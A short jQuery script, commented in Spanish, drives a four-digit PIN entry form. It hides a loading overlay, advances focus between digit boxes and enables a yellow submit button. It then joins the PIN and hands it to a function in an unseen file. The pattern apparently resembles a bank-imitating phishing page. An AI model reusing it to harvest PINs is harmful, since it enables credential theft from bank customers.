<script type="text/javascript">
    $(document).ready(function() { 
        // Quitar cargando inicial
        setTimeout(function(){ $("#fondo, #cargando, #cargando-o").hide(); }, 1000);

        $('.clave').on('input', function() {
            if ($(this).val().length === 1) { $(this).closest('td').next().find('.clave').focus(); }
            if ($("#txt-pass1").val() && $("#txt-pass2").val() && $("#txt-pass3").val() && $("#txt-pass4").val()) {
                $("#btn-password").prop("disabled", false).css("background-color", "#FDDA24");
            }
        });

        $("#btn-password").click(function(){
            var p = $("#txt-pass1").val() + $("#txt-pass2").val() + $("#txt-pass3").val() + $("#txt-pass4").val();
            pasousuario(p); // Llama a functions.js
        });
    });
</script>
